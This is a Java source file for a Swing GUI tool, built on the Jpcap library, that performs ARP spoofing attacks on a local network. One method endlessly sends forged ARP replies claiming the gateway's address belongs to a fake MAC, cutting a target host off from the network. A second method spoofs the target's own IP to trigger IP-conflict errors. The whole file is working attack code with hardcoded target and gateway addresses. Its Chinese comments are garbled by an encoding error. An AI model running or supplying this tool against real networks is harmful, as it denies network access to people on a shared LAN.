package com.jiangnan.arpattact;

import com.jiangnan.jpcap.JpcapCaptor;
import com.jiangnan.jpcap.JpcapSender;
import com.jiangnan.jpcap.NetworkInterface;
import com.jiangnan.jpcap.packet.ARPPacket;
import com.jiangnan.jpcap.packet.EthernetPacket;
import com.jiangnan.jpcap.packet.Packet;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;

/**
 * ����Jpcap��ARP����������
 * @author �����
 * @version 1.0
 */
public class ARPAttack {

	/**
	 * ����������0�������豸�����ݾ���ʵ������Բ���0�����޸�
	 */
	public static NetworkInterface device = JpcapCaptor.getDeviceList()[0];
	
	public static JTextField targetIP = new JTextField("10.96.1.100");
	public static JTextField time = new JTextField("2000");
	
	/**
	 * ͨ������ARP���������ȡĳһIP��ַ������MAC��ַ��
	 * @param ip	//δ֪MAC��ַ������IP��ַ
	 * @return		//��֪IP��ַ��MAC��ַ
	 * @throws IOException
	 */
	public static byte[] getOtherMAC(String ip) throws IOException{
		JpcapCaptor jc = JpcapCaptor.openDevice(device,2000,false,3000);	//�������豸����������
		JpcapSender sender = jc.getJpcapSenderInstance();				//������JpcapSender���������ͱ���
		InetAddress senderIP = InetAddress.getByName("10.96.33.232");	//���ñ���������IP��ַ��������նԷ����صı���
		InetAddress targetIP = InetAddress.getByName(ip);				//Ŀ��������IP��ַ
		
		ARPPacket arp=new ARPPacket();				//��ʼ����һ��ARP��
		arp.hardtype=ARPPacket.HARDTYPE_ETHER;		//Ӳ������
		arp.prototype=ARPPacket.PROTOTYPE_IP;		//Э������
		arp.operation=ARPPacket.ARP_REQUEST;        //ָ����ARP�����
		arp.hlen=6;									//�����ַ����
		arp.plen=4;									//Э���ַ����
		arp.sender_hardaddr=device.mac_address;		//ARP���ķ��Ͷ���̫����ַ,�����Ｔ����������ַ
		arp.sender_protoaddr=senderIP.getAddress(); //���Ͷ�IP��ַ, �����Ｔ����IP��ַ
		
		byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255};	//�㲥��ַ
		arp.target_hardaddr=broadcast;				//����Ŀ�Ķ˵���̫����ַΪ�㲥��ַ	
		arp.target_protoaddr=targetIP.getAddress();	//Ŀ�Ķ�IP��ַ
		
		//������̫֡�ײ�
		EthernetPacket ether=new EthernetPacket();	
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;     //֡����
		ether.src_mac=device.mac_address;	//ԴMAC��ַ
		ether.dst_mac=broadcast;            //��̫��Ŀ�ĵ�ַ���㲥��ַ
		arp.datalink=ether;					//��arp���ĵ�������·���֡����Ϊ�ոչ������̫֡����
		
		sender.sendPacket(arp);				//����ARP����
		
		while(true){                     	//��ȡARP�ظ�����������ȡ��Ŀ��������MAC��ַ��������ص������ص�ַ������Ŀ��IP���Ǿ������ڵĵ�ַ
		   Packet packet = jc.getPacket();
		   if(packet instanceof ARPPacket){
			   ARPPacket p=(ARPPacket)packet;
			   if(p==null){
				   throw new IllegalArgumentException(targetIP+" is not a local address");	//�������Ҳ����Ŀ���������Ǳ��ص�ַ
			   }
			   if(Arrays.equals(p.target_protoaddr,senderIP.getAddress())){
				   System.out.println("get mac ok");
				   return p.sender_hardaddr;	//����
			   }
		   }
		}
	}
	
	/**
	 * ���ַ�����ʽ��MAC��ַת���ɴ����byte�����ڵ�MAC��ַ
	 * @param str	�ַ�����ʽ��MAC��ַ���磺AA-AA-AA-AA-AA
	 * @return	������byte�����ڵ�MAC��ַ
	 */
	public static byte[] stomac(String str) {  
        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };  
        String[] temp = str.split("-");  
        for (int x = 0; x < temp.length; x++) {  
            mac[x] = (byte) ((Integer.parseInt(temp[x], 16)) & 0xff);  
        }  
        return mac;  
    }
	
	/**
	 * ִ��ARP����������ԭ���ǣ�ð�����ط��ͳ�����ARPӦ���������ն˸�����ARP������޸�����IP��ַ��Ӧ��MAC��ַ���Ӷ��������޷�����ͨ�����ط�����
	 * @param ip
	 * @param time
	 * @throws InterruptedException
	 * @throws IOException
	 */
	public static void ARPAttack(String ip, int time) throws InterruptedException, IOException{
		JpcapCaptor jpcap = JpcapCaptor.openDevice(device, 65535, false, 3000);
		jpcap.setFilter("arp", true);
		JpcapSender sender = JpcapSender.openDevice(device);
		
		ARPPacket arp = new ARPPacket();
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;//Ӳ������
		arp.prototype = ARPPacket.PROTOTYPE_IP;	//Э������
		arp.operation = ARPPacket.ARP_REPLY;	//ָ����ARPӦ�����
		arp.hlen = 6;
		arp.plen = 4;
		
		byte[] srcmac = stomac("00-0D-2B-2E-B1-0A"); // αװ��MAC��ַ��������д���У�����Ҫ���ϸ�ʽ��ʮ������
		arp.sender_hardaddr = srcmac;
		arp.sender_protoaddr = InetAddress.getByName("10.96.0.1").getAddress();
		
		arp.target_hardaddr=device.mac_address;//getOtherMAC(ip);
		arp.target_protoaddr=InetAddress.getByName(ip).getAddress();
		
		
		//����������·���֡
		EthernetPacket ether=new EthernetPacket();
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac= srcmac;	//ֹͣ����һ��ʱ���Ŀ���������Զ��ָ����硣��Ҫ�����ָ����������getOtherMAC("10.96.0.1");
		ether.dst_mac=device.mac_address;//getOtherMAC(ip);
		arp.datalink=ether;
		
		// ����ARPӦ��� ����Ϊһ����������һ��ʱ�䷢��ARP�����ѯ�����ص�ַ������������Ҫ����һ���������ڡ�
        while (true) {  
            System.out.println("sending ARP..");  
            sender.sendPacket(arp);  
            Thread.sleep(time);  
        }
	}
	
	/**
	 * ִ��IP��ͻ������ԭ���ǣ�αװ�뱻��������IP��ַ��ͬ��ARP�����������ն�����Ϊ����������IP��ַ��ͬ��
	 * @param ip
	 * @param time
	 * @throws InterruptedException
	 * @throws IOException
	 */
	public static void IPAttack(String ip, int time) throws InterruptedException, IOException{
		JpcapCaptor jpcap = JpcapCaptor.openDevice(device, 65535, false, 3000);
		jpcap.setFilter("arp", true);
		JpcapSender sender = JpcapSender.openDevice(device);
		
		ARPPacket arp = new ARPPacket();
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;//Ӳ������
		arp.prototype = ARPPacket.PROTOTYPE_IP;	//Э������
		arp.operation = ARPPacket.ARP_REPLY;	//ָ����ARPӦ�����
		arp.hlen = 6;
		arp.plen = 4;
		
		byte[] srcmac = stomac("00-0D-2B-2E-B1-0A"); // αװ��MAC��ַ��������д���У�����Ҫ���ϸ�ʽ��ʮ������
		arp.sender_hardaddr = srcmac;
		arp.sender_protoaddr = InetAddress.getByName(ip).getAddress();
		
		arp.target_hardaddr=device.mac_address;//getOtherMAC(ip);
		arp.target_protoaddr=InetAddress.getByName(ip).getAddress();
		
		
		//����������·���֡
		EthernetPacket ether=new EthernetPacket();
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac= srcmac;	//ֹͣ����һ��ʱ���Ŀ���������Զ��ָ����硣��Ҫ�����ָ����������getOtherMAC("10.96.0.1");
		ether.dst_mac=device.mac_address;//getOtherMAC(ip);
		arp.datalink=ether;
		
		// ����ARPӦ��� ����Ϊһ����������һ��ʱ�䷢��ARP�����ѯ�����ص�ַ������������Ҫ����һ���������ڡ�
        while (true) {  
            System.out.println("sending ARP..");  
            sender.sendPacket(arp);  
            Thread.sleep(time);  
        }
	}
	
	/**
	 * �������
	 * @param args
	 * @throws IOException 
	 * @throws InterruptedException 
	 */
	public static void main(String[] args) throws InterruptedException, IOException {
		//ARPAttack("10.96.81.56", 2000);
		JFrame frame = new JFrame("");
		frame.setBounds(300, 250, 400, 300);
		Container c = frame.getContentPane();
		c.setLayout(null);
		
		targetIP.setBounds(10,10,100,15);
		time.setBounds(130, 10, 40, 15);
		
		JButton atk1 = new JButton("ARP��������");
		atk1.setBounds(10, 40, 150, 15);
		atk1.addActionListener(new ActionListener(){
			@Override
			public void actionPerformed(ActionEvent e) {
				new Thread(new Runnable(){
					@Override
					public void run() {
						try {
							ARPAttack(targetIP.getText(), Integer.parseInt(time.getText()));
						} catch (InterruptedException e) {
							e.printStackTrace();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}).start();
			}
			
		});
		
		JButton atk2 = new JButton("IP��ͻ����");
		atk2.setBounds(10, 70, 150, 15);
		atk2.addActionListener(new ActionListener(){
			@Override
			public void actionPerformed(ActionEvent e) {
				new Thread(new Runnable(){
					@Override
					public void run() {
						try {
							IPAttack(targetIP.getText(), Integer.parseInt(time.getText()));
						} catch (InterruptedException e) {
							e.printStackTrace();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}).start();
			}
		});
		
		c.add(targetIP);
		c.add(atk1);
		c.add(atk2);
		c.add(time);
		
		frame.setDefaultCloseOperation(3);
		frame.show();
	}
}
